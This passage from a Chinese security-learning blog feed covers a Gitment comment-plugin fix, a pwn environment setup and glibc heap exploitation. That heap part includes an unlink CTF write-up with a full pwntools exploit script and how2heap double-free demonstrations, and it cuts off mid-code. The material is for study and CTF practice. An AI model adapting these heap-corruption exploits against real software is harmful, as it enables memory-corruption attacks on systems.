class="string">&#123;刚才申请的ClientID&#125;</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">&#123;刚才申请的Client</span> <span class="string">Secret&#125;</span></span><br><span class="line">  <span class="attr">proxy_gateway:</span> <span class="comment"># Address of api proxy, See: https://github.com/aimingoo/intersect</span></span><br><span class="line">  <span class="attr">redirect_protocol:</span> <span class="comment"># Protocol of redirect_uri with force_redirect_protocol when mint enabled</span></span><br></pre></td></tr></table></figure>

<h3 id="开通评论"><a href="#开通评论" class="headerlink" title="开通评论"></a>开通评论</h3><p>到这里原则上就ok了，只要在每篇博客下登陆并初始化就行了，如果你运气好的话。。。。。但是因为这个东西的插件好像没人维护所以会出各种问题，在下面我总结一下会出现的问题。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="Error-Validation-Failed"><a href="#Error-Validation-Failed" class="headerlink" title="Error: Validation Failed"></a>Error: Validation Failed</h3><p>issue的Label有长度限制,对于中文博客来说,中文标题很容易就超过长度限制,所以需要做一下特殊处理,修改<code>blog/_config.yml</code>把permalink: :year/:month/:day/:title/ 改成:year/:month/:day/:id/ 可以解决这个问题.</p>
<h3 id="Error-Object-ProgressEvent"><a href="#Error-Object-ProgressEvent" class="headerlink" title="Error: [Object ProgressEvent]"></a>Error: [Object ProgressEvent]</h3><p>出现这个问题是由于作者在gitment.browser.js中硬编码了自己的服务器人证域名:<a href="https://gh-oauth.imsun.net，现在域名过期了,要么自己搭一个认证服务器，要么可以用其他人的，在gitment的issues里面找到了答案:#175,需要把Hexo你所用的主题中的引用文件给改一下，我用的是next主题,改动方法如下" target="_blank" rel="noopener">https://gh-oauth.imsun.net，现在域名过期了,要么自己搭一个认证服务器，要么可以用其他人的，在gitment的issues里面找到了答案:#175,需要把Hexo你所用的主题中的引用文件给改一下，我用的是next主题,改动方法如下</a>:<br>修改<code>blog/themes/next/layout/_third-party/comments/gitment.swig</code>，找到下面这部分代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://imsun.github.io/gitment/style/default.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://imsun.github.io/gitment/dist/gitment.browser.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://billts.site/extra_css/gitment.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://billts.site/js/gitment.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Error-Not-Found问题"><a href="#Error-Not-Found问题" class="headerlink" title="Error: Not Found问题"></a>Error: Not Found问题</h3><p>owner或者repo配置错误了，注意名字和仓库名字的大小写。</p>
<h3 id="其它问题"><a href="#其它问题" class="headerlink" title="其它问题"></a>其它问题</h3><p>多尝试 hexo clean 后再试试，有可能是缓存没清楚的问题。<br>退出github再登陆，有的时候也可以解决问题。</p>
]]></content>
      <categories>
        <category>blog</category>
      </categories>
  </entry>
  <entry>
    <title>unlink入门题</title>
    <url>/year/09/20/cl7iordq40048293fyse6qz4t/</url>
    <content><![CDATA[<p>刚学了unlink,总结下利用方式和思路</p>
<a id="more"></a>
<h2 id="0x0-unlink漏洞分析"><a href="#0x0-unlink漏洞分析" class="headerlink" title="0x0 unlink漏洞分析"></a>0x0 unlink漏洞分析</h2><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p><strong>free函数在释放堆块时,会判断相邻前,后堆块是否为空闲堆块,是就会进行合并,然后利用unlink机制将该空闲堆块从unsorted bin中取下.</strong></p>
<h2 id="源码细节"><a href="#源码细节" class="headerlink" title="源码细节"></a>源码细节</h2><p>触发条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"><span class="comment">/* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */</span></span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line"><span class="comment">/* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    <span class="comment">/* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */</span></span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以让一个构造出来的<code>fake chunk</code>被<code>unlink</code>导致一次固定地址写.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                   </span></span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		                </span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;								              </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		                                     </span><br><span class="line">	        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">	            malloc_printerr (check_action, <span class="string">"corrupted double-linked list (not small)"</span>, P, AV);					                 </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				              </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				              </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="keyword">else</span> &#123;							                      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </span><br><span class="line">                &#125;							                          </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;							                      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		  </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		  </span><br><span class="line">            &#125;								                          </span><br><span class="line">        &#125;								                              </span><br><span class="line">    &#125;									                              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要绕过检测<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0),使P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>为真.<br>所以<code>fake chunk</code>可以如下构造.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fake_pre_size | fake_size | &amp;target - <span class="number">0x18</span> | &amp;target - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h2 id="0x1分析程序"><a href="#0x1分析程序" class="headerlink" title="0x1分析程序"></a>0x1分析程序</h2><p>通过反汇编可知，程序是一个笔记本程序，可以对笔记本进行增加，删除，修改操作。我首先考虑栈溢出的情况，但是没有找到可以溢出的位置。然后又寻找uaf和double free漏洞是否存在，发现所有位置在free后都置为了0，也没有这个漏洞。最后发现它在修改操作上出现了一些问题。<br><img src="/20/cl7iordq40048293fyse6qz4t/1.png" alt="1"><br>它进行的修改操作：</p>
<ul>
<li>输入要修改note的索引</li>
<li>检测该索引是否有note存在，若无则退出程序</li>
<li>输入要修改后内容的最大字节数</li>
<li>输入内容<br>可以想到如果我们输入的修改后的最大字节数比一开始malloc的空间大的话，我们就可以在输入时覆盖掉当前这个note后面的chunk的内容。我们就可以用unlink的方式实现任意地址写</li>
</ul>
<h2 id="0x2利用方式"><a href="#0x2利用方式" class="headerlink" title="0x2利用方式"></a>0x2利用方式</h2><p>写好增加，删除，修改的函数，避免写一些重复。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size, stri)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Size of note : "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content of note:"</span>)</span><br><span class="line">    sh.sendline(stri)</span><br><span class="line">    sh.recvuntil(<span class="string">"Success!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.sendline(index)</span><br><span class="line">    sh.recvuntil(<span class="string">"Done !\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(index, size, stri)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    sh.sendline(index)</span><br><span class="line">    sh.recvuntil(<span class="string">"Size of note : "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content of note : "</span>)</span><br><span class="line">    sh.sendline(stri)</span><br><span class="line">    sh.recvuntil(<span class="string">"Done !\n"</span>)</span><br></pre></td></tr></table></figure>

<p>申请三个note,使其足够大，避免free后被加入到fastbin中。因为fastbin中的空闲块不会合并，自然也就无法利用unlink了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>) + p64(buf<span class="number">-0x18</span>) + p64(buf<span class="number">-0x10</span>) + <span class="string">'a'</span>*<span class="number">0x70</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="string">"0"</span>, <span class="number">0xa0</span>, payload)</span><br><span class="line">delete_note(<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<p>这时构造payload,unlink操作后<code>buf = &amp;buf - 0x18</code></p>
<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size, stri)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Size of note : "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content of note:"</span>)</span><br><span class="line">    sh.sendline(stri)</span><br><span class="line">    sh.recvuntil(<span class="string">"Success!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.sendline(index)</span><br><span class="line">    sh.recvuntil(<span class="string">"Done !\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(index, size, stri)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    sh.sendline(index)</span><br><span class="line">    sh.recvuntil(<span class="string">"Size of note : "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content of note : "</span>)</span><br><span class="line">    sh.sendline(stri)</span><br><span class="line">    sh.recvuntil(<span class="string">"Done !\n"</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x4040C0</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x90</span>, <span class="string">"1"</span>) <span class="comment">#0</span></span><br><span class="line">add_note(<span class="number">0x90</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">add_note(<span class="number">0x90</span>, <span class="string">"1"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>) + p64(buf<span class="number">-0x18</span>) + p64(buf<span class="number">-0x10</span>) + <span class="string">'a'</span>*<span class="number">0x70</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="string">"0"</span>, <span class="number">0xa0</span>, payload)</span><br><span class="line">delete_note(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(target)</span><br><span class="line">edit_note(<span class="string">"0"</span>, <span class="number">0x18</span>, payload2)</span><br><span class="line"></span><br><span class="line">eidt_note(<span class="string">"0"</span>, <span class="number">0x8</span>, p64(<span class="number">0x7E4</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-总结堆溢出-amp-amp-unlink"><a href="#0x4-总结堆溢出-amp-amp-unlink" class="headerlink" title="0x4 总结堆溢出&amp;&amp; unlink"></a>0x4 总结堆溢出&amp;&amp; unlink</h2><p>如果程序存在堆溢出漏洞，可以在当前<code>chunk</code>伪造一个小0x10的<code>fake chunk</code>,同时将下一个<code>chunk</code>头部的<code>prve size</code>修改，然后<code>free</code>下一<code>chunk</code>触发<code>unlink</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pre_size1 | size1 | fake_pre_size = pre_size1 ? pre_size1 + <span class="number">0x10</span> : <span class="number">0</span> | fake_size = size1 - <span class="number">0x10</span> | &amp;target - <span class="number">0x18</span> | &amp;target - <span class="number">0x10</span> | padding | fake_size align | size2 &amp; ~<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>要求<code>target = P</code>.结果<code>target = &amp;target - 0x18</code>.</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>虚拟机安装以及pwn环境配置</title>
    <url>/year/09/20/cl7iordqt0068293fu854qxe9/</url>
    <content><![CDATA[<h2 id="0x1虚拟机的安装"><a href="#0x1虚拟机的安装" class="headerlink" title="0x1虚拟机的安装"></a>0x1虚拟机的安装</h2><p><a href="https://blog.csdn.net/Wangpeng1614490140/article/details/79079642" target="_blank" rel="noopener">Ubuntu16虚拟机安装详细教程</a></p>
<a id="more"></a>

<h2 id="0x2配置优化（加快下载速度）"><a href="#0x2配置优化（加快下载速度）" class="headerlink" title="0x2配置优化（加快下载速度）"></a>0x2配置优化（加快下载速度）</h2><h3 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .pip</span><br><span class="line">cd .pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure>

<p><code>pip.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">trusted-host =  mirrors.aliyun.com</span><br><span class="line">index-url = https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure>

<h3 id="apt换源"><a href="#apt换源" class="headerlink" title="apt换源"></a>apt换源</h3><p>在系统设置-软件和更新中修改.</p>
<p><img src="/20/cl7iordqt0068293fu854qxe9/1.png" alt="1.png"></p>
<p>修改为中国的阿里云</p>
<h2 id="0x3虚拟机pwn环境配置"><a href="#0x3虚拟机pwn环境配置" class="headerlink" title="0x3虚拟机pwn环境配置"></a>0x3虚拟机pwn环境配置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">pwngdb,调试神器</span></span><br><span class="line">sudo apt-get install gcc-multilib</span><br><span class="line">sudo apt-get install libc6:i386</span><br><span class="line"><span class="meta">#</span><span class="bash">64位系统跑32位程序</span></span><br><span class="line">pip install pwntools</span><br><span class="line"><span class="meta">#</span><span class="bash">pwntools</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>入门</category>
      </categories>
  </entry>
  <entry>
    <title>how2heap总结上</title>
    <url>/year/09/11/cl7iordpg002k293filar99fb/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章是看过安全客上的一篇文章后自己做了一些总结，在此分享，下面贴出原文链接 <a href="https://www.anquanke.com/post/id/86808" target="_blank" rel="noopener">how2heap总结上</a>。<br>不过在学习这些利用知识之前还是先推荐看一下华庭写的<strong>Glibc内存管理-Ptmalloc2源码分析</strong>。</p>
<a id="more"></a>
<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>Ubuntu 16.04.3 LTS x64</p>
<p>GLIBC 2.23</p>
<h2 id="0x02-目录"><a href="#0x02-目录" class="headerlink" title="0x02 目录"></a>0x02 目录</h2><p>firtst_fit</p>
<p>fastbin_dup</p>
<p>fsatbin_dup_into_stack</p>
<p>unsafe_unlink</p>
<h2 id="0x03-first-fit"><a href="#0x03-first-fit" class="headerlink" title="0x03 first_fit"></a>0x03 first_fit</h2><p><strong>源码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>输出：</strong></p>
<p><img src="/11/cl7iordpg002k293filar99fb/output1.png" alt="输出1"></p>
<p><strong>个人总结</strong></p>
<p>如果有一个空闲的且足够大的chunk，malloc会优先分配这个chunk。<code>use-after-free</code>就是这种机制的一个利用场景。</p>
<h2 id="0x04-fastbin-dup"><a href="#0x04-fastbin-dup" class="headerlink" title="0x04 fastbin_dup"></a>0x04 fastbin_dup</h2><p><strong>源码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>输出：</strong></p>
<p><img src="/11/cl7iordpg002k293filar99fb/output2.png" alt="output2"></p>
<p><strong>个人总结：</strong></p>
<p>这个程序展示了<code>double-free</code>的攻击。我们发先连续free两次a，程序就会报错，因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到。但是free掉a后再free b然后再free a程序就不会报错。因为这个时候a并不在链表顶部。</p>
<p>三次free后链表结构如下<br><img src="/11/cl7iordpg002k293filar99fb/double-free2.png" alt="double-free1"></p>
<p>其实应该是个循环结构</p>
<h2 id="0x05-fastbin-dup-into-stack"><a href="#0x05-fastbin-dup-into-stack" class="headerlink" title="0x05 fastbin_dup_into_stack"></a>0x05 fastbin_dup_into_stack</h2><p><strong>源码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span 